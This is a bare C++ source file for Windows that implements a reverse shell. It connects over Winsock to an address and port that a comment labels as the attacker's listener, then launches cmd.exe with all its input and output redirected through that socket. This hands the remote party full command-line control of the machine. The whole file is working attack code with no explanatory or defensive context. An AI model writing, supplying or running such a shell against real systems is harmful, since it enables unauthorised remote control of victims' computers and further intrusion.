#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <shellapi.h>
#include <string>

WSADATA wsaData;
SOCKET wSock;
struct sockaddr_in hax;
STARTUPINFO sui;
PROCESS_INFORMATION pi;

using namespace std;

int main(int argc, char* argv[])
{
  // listener ip, port on attacker's machine
  string ip = "10.10.14.21";
  short port = 4321;

  // init socket lib
  WSAStartup(MAKEWORD(2, 2), &wsaData);

  // create socket
  wSock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(port);
  hax.sin_addr.s_addr = inet_addr(ip.c_str());

  // connect to remote host
  WSAConnect(wSock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);

  memset(&sui, 0, sizeof(sui));
  sui.cb = sizeof(sui);
  sui.dwFlags = STARTF_USESTDHANDLES;
  sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) wSock;

  // start cmd.exe with redirected streams
  char cmd[8] = "cmd.exe";
  CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
  exit(0);
}
